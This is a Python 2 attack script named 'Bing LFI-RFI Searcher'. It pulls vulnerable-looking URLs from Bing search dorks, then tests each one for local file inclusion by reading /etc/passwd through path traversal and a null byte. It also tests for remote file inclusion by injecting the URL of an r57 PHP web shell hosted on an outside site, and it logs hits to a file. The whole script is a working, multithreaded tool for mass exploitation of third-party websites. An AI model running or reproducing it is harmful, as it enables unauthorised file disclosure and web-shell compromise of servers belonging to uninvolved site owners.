##################################################
# Bing LFI-RFI Searcher
# Coded by Miyachung
# Janissaries.Org
# Miyachung@hotmail.com
##################################################
import threading
import urllib2,urllib,socket
import re
import time
import sys
socket.setdefaulttimeout(5)
def dorker(url,limit,shell):
        try:
              regex = re.compile("h3><a href=\"(.*?)\" h=")
              path   = "../../../../../../../../../../../../../../etc/passwd"
              pathn  = "../../../../../../../../../../../../../../etc/passwd%00"
              conn = urllib2.urlopen(url)
              data = conn.read()
              links= regex.findall(data)
              for link in links:
                  link = link.strip()
                  if re.search("=",link) and link.find("youtube") == -1 and link.find("forum") == -1 and link.find("google") == -1 and link.find("viewtopic") == -1 and link.find("showthread") == -1 and link.find("blog") == -1 and link.find("yahoo") == -1:
                      link = link.split('=')
                      link = link[0]+"="
                      check= urllib2.urlopen(link+path,None,3).read()
                      if re.search("root:x",check):
                        a =  "#########################################################\r\n"
                        a+= "[+]"+link+" /etc/passwd readed without null byte\r\n"
                        a+= "[+]read -> "+link+path+"\r\n"
                        a+= "[+]coded by miyachung\r\n"
                        print a + "#########################################################"
                        kaydet(a)
                      else:
                        check = urllib2.urlopen(link+pathn,None,3).read()
                        if re.search("root:x",check):
                            a = "#########################################################\r\n"
                            a += "[+]"+link+" /etc/passwd readed with null byte!\r\n"
                            a += "[+]read -> "+link+pathn+"\r\n"
                            a += "[+]coded by miyachung\r\n"
                            print a + "#########################################################"
                            kaydet(a)
                        else:
                            print link+" hasn't got lfi vulnerability"
                            checkrfi = urllib2.urlopen(link+shell,None,3).read()
                            if re.search("safe_mode",checkrfi):
                                a = "#########################################################\r\n"
                                a+= "[+]remote file include vulnerability works!\r\n"
                                a+= "[+]shell -> "+link+shell+"\r\n"
                                a+= "[+]coded by miyachung\r\n"
                                print a + "#########################################################"
                                kaydet(a)
                            else:
                                print link+" hasn't got rfi vulnerability"
        except urllib2.URLError:
            print link+" urlerror"
            pass
        except urllib2.HTTPError:
            print link+" httperror"
            pass
        except socket.timeout:
            print link+" timeout"
            pass
        except:
            pass

        limit.release()
def kaydet(yazi):
    ac = open('results.txt','ab')
    ac.write(yazi)
    ac.close()
class Exploiter:
    def main(self,dorks,thread,shell):
        for dork in open(dorks):
            dork  = dork.strip()
            i     = 1
            limit = threading.BoundedSemaphore(value=thread)
            tasks = []
            while i <= 451:
                  limit.acquire()
                  th = threading.Thread(target=dorker,args=("http://www.bing.com/search?q="+urllib.quote_plus(dork)+"&count=50&first="+str(i)+"&FORM=PERE",limit,shell,))
                  tasks.append(th)
                  th.start()
                  i += 50
            for t in tasks:
                t.join()
try:
    exploit = Exploiter()
    exploit.main(sys.argv[1],int(sys.argv[2]),"http://www.xfocus.net/tools/200608/r57.txt?")
except IndexError:
    print "# Bing LFI-RFI Searcher"
    print "# Coded by Miyachung"
    print "# Janissaries.Org"
    print "Usage: python searcher.py DORKLISTFILE THREAD"
    print "Examp: python searcher.py dorks.txt 10"
